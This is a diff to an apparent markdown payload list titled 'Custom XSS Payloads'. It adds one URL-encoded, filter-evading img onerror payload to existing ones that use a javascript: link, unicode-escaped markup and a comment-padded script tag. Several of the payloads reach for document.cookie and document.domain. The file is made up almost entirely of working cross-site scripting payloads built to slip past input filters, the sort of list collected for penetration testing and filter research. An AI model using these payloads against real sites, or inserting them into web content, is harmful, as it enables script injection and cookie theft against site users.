@@ -1,5 +1,6 @@
 # Custom XSS Payloads
 ```javascript
+"\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>
 <img src=123><img src=123><a href="javascript:alert(document.domain)">xss</a><svg></svg><img src=1>
 \u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e
 <script /***/>/***/confirm(document.cookie,document.domain)/***/</script /***/
